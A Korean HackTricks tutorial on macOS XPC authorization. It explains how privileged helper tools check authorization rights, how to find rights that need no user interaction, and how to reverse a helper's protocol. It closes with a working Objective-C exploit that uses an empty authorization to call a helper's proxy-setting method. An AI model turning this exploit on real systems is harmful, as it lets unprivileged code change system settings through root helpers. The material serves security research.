# macOS XPC 권한 부여

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>

## XPC 권한 부여

Apple은 **연결된 프로세스가 노출된 XPC 메서드를 호출할 **권한이 있는지를 인증하는 또 다른 방법을 제안합니다.

응용 프로그램이 **특권 사용자로서 작업을 실행해야 하는 경우**, 일반적으로 특권 사용자로서 응용 프로그램을 실행하는 대신 XPC 서비스로 HelperTool을 루트로 설치하여 응용 프로그램에서 해당 작업을 수행할 수 있습니다. 그러나 서비스를 호출하는 응용 프로그램은 충분한 권한을 가져야 합니다.

### ShouldAcceptNewConnection 항상 YES

[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 예제를 찾을 수 있습니다. `App/AppDelegate.m`에서 **HelperTool**에 **연결**을 시도합니다. 그리고 `HelperTool/HelperTool.m`에서 **`shouldAcceptNewConnection`** 함수는 이전에 지정된 요구 사항을 확인하지 않습니다. 항상 YES를 반환합니다.
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
### 애플리케이션 권한

그러나 **HelperTool에서 메소드를 호출할 때 권한이 부여**됩니다.

`App/AppDelegate.m`의 **`applicationDidFinishLaunching`** 함수는 앱이 시작된 후에 빈 권한 참조를 만듭니다. 이것은 항상 작동해야 합니다.\
그런 다음 `setupAuthorizationRights`를 호출하여 해당 권한 참조에 **일부 권한을 추가**하려고 시도합니다:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
함수 `setupAuthorizationRights`은 `Common/Common.m`에서 애플리케이션의 권한을 auth 데이터베이스 `/var/db/auth.db`에 저장합니다. 데이터베이스에 아직 없는 권한만 추가됨을 주목하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
함수 `enumerateRightsUsingBlock`은 애플리케이션 권한을 가져오는 데 사용되며, 이는 `commandInfo`에 정의되어 있습니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이는 이 프로세스의 끝에 `commandInfo` 내에서 선언된 권한이 `/var/db/auth.db`에 저장된다는 것을 의미합니다. **각 메소드**에 대해 **인증이 필요한** 권한 이름과 `kCommandKeyAuthRightDefault`를 찾을 수 있다는 점에 유의하십시오. 후자는 **이 권한을 얻을 수 있는 사용자**를 나타냅니다.

권한에 액세스할 수 있는 사용자를 나타내는 다양한 범위가 있습니다. 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h)에 정의되어 있습니다([여기에서 모두 찾을 수 있습니다](https://www.dssw.co.uk/reference/authorization-rights/)), 하지만 요약하면:

<table><thead><tr><th width="284.3333333333333">이름</th><th width="165">값</th><th>설명</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>누구나</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자가 관리자여야 함(관리자 그룹 내)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 인증 요청</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 인증 요청. 관리자여야 함(관리자 그룹 내)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>규칙 지정</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>권한에 대한 추가 설명 지정</td></tr></tbody></table>

### 권한 확인

`HelperTool/HelperTool.m`에서 **`readLicenseKeyAuthorization`** 함수는 **해당 메소드를 실행할 권한이 있는지** 확인하기 위해 **`checkAuthorization`** 함수를 호출하는 호출자를 확인합니다. 이 함수는 호출 프로세스가 보낸 **authData**가 **올바른 형식**인지 확인한 다음 **특정 메소드를 호출할 권한**을 확인합니다. 모든 것이 순조롭게 진행되면 **반환된 `error`는 `nil`이 될 것입니다**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
**주의:** 해당 메소드를 호출할 권한을 확인하려면 `authorizationRightForCommand` 함수가 이전에 주석 처리된 `commandInfo` 객체를 확인합니다. 그런 다음 함수를 호출하여 함수를 호출할 권한이 있는지 확인합니다. (플래그가 사용자와의 상호 작용을 허용하는지 확인).

이 경우 `readLicenseKeyAuthorization` 함수를 호출하려면 `kCommandKeyAuthRightDefault`가 `@kAuthorizationRuleClassAllow`로 정의되어 있습니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장된다고 언급되었습니다. 다음 명령을 사용하여 저장된 모든 규칙을 나열할 수 있습니다:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그럼, 누가 권한에 액세스할 수 있는지 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용 권한

**모든 권한 구성을** [**여기**](https://www.dssw.co.uk/reference/authorization-rights/)에서 찾을 수 있지만 사용자 상호 작용이 필요하지 않은 조합은 다음과 같습니다:

1. **'authenticate-user': 'false'**
* 이것은 가장 직접적인 키입니다. `false`로 설정되면 사용자가 이 권한을 얻기 위해 인증을 제공할 필요가 없음을 지정합니다.
* 이는 **아래 2개 중 하나와 조합**되거나 사용자가 속해야 하는 그룹을 나타내는 데 사용됩니다.
2. **'allow-root': 'true'**
* 사용자가 루트 사용자로 작동하고(승격된 권한을 가지고 있는)이 키가 `true`로 설정된 경우, 루트 사용자는 추가 인증 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 루트 사용자 상태에 도달하는 데는 이미 인증이 필요하므로 대부분의 사용자에게는 "인증 없음" 시나리오가 아닙니다.
3. **'session-owner': 'true'**
* `true`로 설정되면 세션 소유자(현재 로그인한 사용자)가 자동으로 이 권한을 얻게 됩니다. 사용자가 이미 로그인되어 있는 경우 추가 인증을 우회할 수 있습니다.
4. **'shared': 'true'**
* 이 키는 인증 없이 권한을 부여하지 않습니다. 대신 `true`로 설정되면 권한이 인증된 후 여러 프로세스 사이에서 공유될 수 있음을 의미합니다. 그러나 권한의 초기 부여는 여전히 인증이 필요하며, `'authenticate-user': 'false'`와 같은 다른 키와 조합되지 않는 한 각각의 프로세스가 다시 인증할 필요가 없습니다.

흥미로운 권한을 얻기 위해 [**이 스크립트를 사용**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)할 수 있습니다:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## 권한 반전

### EvenBetterAuthorization 사용 여부 확인

만약 **`[HelperTool checkAuthorization:command:]`** 함수를 찾는다면, 해당 프로세스가 권한에 대해 이전에 언급한 스키마를 사용하고 있을 가능성이 높습니다:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

이 함수가 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`와 같은 함수를 호출한다면, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)를 사용하고 있습니다.

권한이 부여되지 않은 사용자 상호작용 없이 특정 특권 작업을 호출할 수 있는 권한을 얻을 수 있는지 확인하기 위해 **`/var/db/auth.db`**를 확인합니다.

### 프로토콜 통신

그런 다음, XPC 서비스와 통신을 수립할 수 있도록 프로토콜 스키마를 찾아야 합니다.

**`shouldAcceptNewConnection`** 함수는 내보내는 프로토콜을 나타냅니다:

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

이 경우, EvenBetterAuthorizationSample과 동일하게 [**이 라인**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)을 확인합니다.

사용 중인 프로토콜의 이름을 알면, 해당 프로토콜의 헤더 정의를 **덤프**할 수 있습니다:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 통신을 수립하기 위해 노출된 Mach 서비스의 **이름**을 알아야 합니다. 이를 찾는 여러 방법이 있습니다:

* **`[HelperTool init]`**에서 사용된 Mach 서비스를 볼 수 있는 곳:

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

* launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

다음은 생성된 예제입니다:

* 함수를 사용하여 프로토콜의 정의
* 액세스를 요청하기 위해 사용할 빈 auth
* XPC 서비스에 대한 연결
* 연결이 성공하면 함수를 호출합니다
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 참고 자료

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
